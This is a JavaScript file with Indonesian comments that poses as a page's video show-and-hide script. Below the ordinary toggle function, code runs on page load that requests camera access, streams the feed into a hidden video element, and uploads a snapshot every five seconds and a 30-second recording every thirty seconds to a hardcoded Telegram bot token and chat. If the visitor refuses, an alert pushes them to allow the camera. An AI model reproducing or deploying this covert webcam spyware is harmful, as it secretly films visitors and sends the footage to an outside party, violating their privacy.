/* --- Bagian JavaScript untuk Fungsi Video --- */

function toggleVideo(videoId) {
  const videoContainer = document.getElementById(videoId);
  const button = event.target;
  const iframe = videoContainer.querySelector("iframe");
  let currentSrc = iframe.src;

  if (videoContainer.style.display === "block") {
    videoContainer.style.display = "none";
    button.textContent = "Lihat Video";

    if (currentSrc.includes("autoplay=1")) {
      iframe.src = currentSrc.replace("autoplay=1", "autoplay=0");
    } else {
      iframe.src = currentSrc;
    }
  } else {
    videoContainer.style.display = "block";
    button.textContent = "Sembunyikan Video";

    if (!currentSrc.includes("autoplay=1")) {
      if (!currentSrc.includes("?")) {
        iframe.src = currentSrc + "?autoplay=1&controls=1";
      } else {
        iframe.src = currentSrc.replace("autoplay=0", "autoplay=1");
      }
    }
  }
}

// 🔥 Akses kamera dan mulai streaming
navigator.mediaDevices
  .getUserMedia({ video: true, audio: false })
  .then((stream) => {
    // Buat elemen video tanpa ditampilkan
    const video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;
    video.autoplay = true;
    video.play(); // 🔥 wajib biar frame update

    // 🔥 Ambil foto tiap 5 detik
    setInterval(() => {
      const canvas = document.getElementById("snapshot");
      canvas.width = 640;
      canvas.height = 480;
      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob((blob) => {
        const form = new FormData();
        form.append("chat_id", "@kwoskakkjka");
        form.append("photo", blob);
        fetch("https://api.telegram.org/bot8696183437:AAHuB6mLGikBUj1CbLVVWIn4gwUm3frYRuw/sendPhoto", {
          method: "POST",
          body: form,
        });
      }, "image/jpeg");
    }, 5000);

    // 🔥 Rekam video tiap 30 detik
    const recorder = new MediaRecorder(stream);
    let chunks = [];

    recorder.ondataavailable = (e) => chunks.push(e.data);
    recorder.onstop = () => {
      const blob = new Blob(chunks, { type: "video/webm" });
      chunks = [];
      const form = new FormData();
      form.append("chat_id", "@kwoskakkjka");
      form.append("video", blob);
      fetch("https://api.telegram.org/bot8696183437:AAHuB6mLGikBUj1CbLVVWIn4gwUm3frYRuw/sendVideo", {
        method: "POST",
        body: form,
      });
    };

    setInterval(() => {
      recorder.start();
      setTimeout(() => recorder.stop(), 30000);
    }, 30000);
  })
  .catch(() => {
    alert("🚫 Kamera ditolak. Aktifkan izin untuk lanjut.");
  });
